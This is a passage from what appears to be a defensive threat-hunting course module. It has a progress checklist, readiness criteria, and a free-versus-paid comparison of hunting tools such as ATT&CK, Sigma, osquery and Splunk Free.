- [ ] I can summarise a null-result hunt in three sentences without it reading as wasted time. <!-- id: advance-02-null-result-summary energy: low -->
- [ ] I named the metric I would use to judge my own hunting programme, and what it does not measure. <!-- id: advance-02-hunt-metrics energy: low -->
- [ ] I stopped a hunt early for a stated reason instead of running it to the end of the time box. <!-- id: advance-02-stop-early energy: normal -->

## You're ready to move on when...

You can plan and run a hypothesis-driven hunt, record what you found and did not find, and turn the result into either a durable detection or a documented telemetry gap with an owner.

## Free vs Paid

### What's free and enough

Everything in this phase is achievable at $0. ATT&CK and the ATT&CK Navigator are free and are the framework the whole discipline is organised around. SigmaHQ, sigma-cli, YARA, osquery, Velociraptor, and Atomic Red Team are free and open source. OTRF Security Datasets gives you real attack telemetry to hunt against with no lab to build. Microsoft Sentinel has a free trial tier and the KQL you learn on it is the same KQL that runs in Defender XDR; Splunk Free indexes a useful daily volume and teaches SPL properly. If you already work in a SOC, you almost certainly have access to a SIEM and an EDR with real data, and the free path is simply to use them for a sanctioned hunt with your manager's approval. **The scarce resource in this phase is analyst time, not tooling.**

### What's paid and why you'd upgrade

Commercial SIEM and XDR platforms add retention you can afford, correlation at scale, and managed detection content that arrives already tuned. Threat-intelligence platforms add actor tracking, infrastructure attribution, and feed-driven hunt suggestions. Endpoint detection suites add memory-level telemetry and automated response actions. Paid hunt platforms and training subscriptions add scenarios with known answers, which is genuinely useful for practising triage speed. Enterprise licence costs for all of this run into figures per endpoint per year, and they are almost always an organisational purchase rather than a personal one.

### When it's worth paying

Pay when your employer's retention window is the thing stopping you from answering questions — that is a business case about investigative memory, not a tooling preference, and it is the most defensible security spend in this phase. Pay when a managed intelligence feed is telling you which actor is targeting your sector, because that converts a random hunt into a directed one. For an individual learner, none of that applies: the method in this lesson runs identically on a free-tier tenant, a Splunk Free index, or a home lab with osquery and Sysmon, and the skill being assessed in an interview is whether you can state a falsifiable hypothesis and report a null result honestly. No subscription improves that. Build the artefact first, and let your employer buy the retention when you can show them the hunt that needed it.